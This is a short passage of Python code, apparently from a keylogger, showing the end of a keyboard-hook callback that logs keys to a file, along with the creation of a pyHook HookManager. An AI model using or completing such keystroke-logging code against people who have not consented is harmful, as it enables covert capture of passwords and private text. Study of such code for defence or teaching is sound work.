            print (event.Key)                 #Debugging print statement.  
        except Exception as e: 
             print (e)                       
   
                   
        finally:     
           file.close()              #Finaly closes the log file.  
    return True     #Returns true so that other keys can also be recorded when pressed.  
            
hm = pyHook.HookManager()             #Create a hook manager object       
